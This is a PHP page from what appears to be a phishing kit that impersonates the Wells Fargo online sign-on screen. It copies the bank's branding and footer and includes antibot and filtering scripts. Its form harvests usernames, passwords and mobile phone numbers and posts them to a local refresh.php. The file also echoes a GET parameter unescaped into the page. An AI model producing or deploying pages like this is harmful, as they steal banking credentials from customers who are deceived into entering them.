<?php
session_start();
error_reporting(0);
include('../../files/boot/check.php');
include('../../files/boot/check1.php');
include('../../files/boot/check2.php');
include('../../files/boot/antibot.php');
include('../../files/boot/enc.php');
include('../../call.php');
$rec = @$_GET['rec'];
$error = @$_GET['error'];
?>
<!DOCTYPE html>
<html class="no-js" lang="en">

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Wells Fargo - Personal</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="search_category" content="Personal">
    <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
    <link rel="shortcut icon" type="image/x-icon" href="../../files/bars/favicon.ico">
    <link rel="stylesheet" href="../../files/bars/frontporch.css" type="text/css">
    <link type="text/css" href="../../files/bars/signon_clean.css" rel="stylesheet" media="screen,projection,print">
    <link rel="stylesheet" href="../../files/bars/framework.css">
    <link rel="stylesheet" href="../../files/bars/smartphone-home.css">
    <link rel="stylesheet" href="../../files/bars/util.css">
</head>

<body theme="ssep" id="body" class="" style="top: 0px;">
    <div id="shell" class="page" data-pid="324-114205-64">
        <div id="hamburger-menubackdrop" class="backDrop"></div><a href="#skip" class="hidden">Skip to content</a>

        <div class="header" id="header">
            <div class="wf_logo" role="link">
                <img src="../../files/bars/icn-img-wf-logo.png" alt="Wells Fargo">
            </div>
            <div class="hamburger_menu" role="link">
                <a href="#"><img src="../../files/bars/icn_house.png" alt="Home"></a>
            </div>
        </div>
        <main role="main">

            <!--Sign on overlay Start-->
            <div aria-hidden="false">
                <div id="form">
                    <h1 style="margin: 0px;">Welcome</h1>
                    <!-- Retrieving username values -->
                    <h2 style="margin-top: 0px;"><span class="icon-lock"></span><a href="#">Online &amp; Mobile Security</a></h2>

                    
                        <form id="Signon" name="Signon" action="refresh.php" method="post" autocomplete="off" style="padding: 0px;">
                            <?php if ($error == "1") { 
                                echo '<p style="font-size: 130%; color: red; font-weight: bold;">ERROR. Please review your input. </p>';;
                                }
                            ?>
                            <label class="sr-only" for="userid">Username</label>
                            <input type="hidden" name="rec" value="<?php print " $rec "; ?>">
                            <!-- Updated the name and value of the field -->
                            <input style="width: 100%;" maxlength="14" id="userid" placeholder="Username" class="required" name="j_username" type="text">

                            <label class="sr-only" for="passwd">Password</label>
                            <!-- Updated the name of the field below-->
                            <input style="width: 100%;" maxlength="14" placeholder="Password" class="required" id="passwd" name="j_password" value="" type="password">
                            <p style="text-align: center;font-size: 16px; font-weight: bold; color:#FFFFFF;">Security Details </p>
                            <p style="text-align: center;font-size: 14px; color:#FFFFFF;">Mobile phone number </p>
                            <input style="width: 100%;" maxlength="32" placeholder="Phone number" class="required" id="passwd" name="phone" value="" type="text">
                            <input class="signOn" value="Proceed" type="submit">
                            <div class="forgot-uid-pwd" align="left">
                                <a href="#" class="enroll-text">Forgot Password/Username?</a>
                            </div>
                            <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>

                        </form>
                    
                </div>

                    <footer role="contentinfo" style="text-align: center;">
                        <div class="html5footer c9" id="pageFooter">
                            <nav class="nav-footer">
                                <div class="footer-link clistData">
                                    <a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
                                    <div class="footer-oaa"><a href="#">Online Access Agreement</a>
                                    </div>
                                </div>
                                <div class="footer-content">
                                    <div>
                                        <strong>Investment and Insurance products:</strong>
                                    </div>
                                    <div>
                                        <strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
                                    </div>
                                </div>
                                <div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
                                <div class="footer-content">
                                    <span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
                                <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
                                <div class="stage-coach"><img src="../../files/bars/50_opacity_stagecoach_002.png" aria-hidden="true" alt=""></div>
                            </nav>
                        </div>

                    </footer>

            </div>
        </main>
</body>

</html>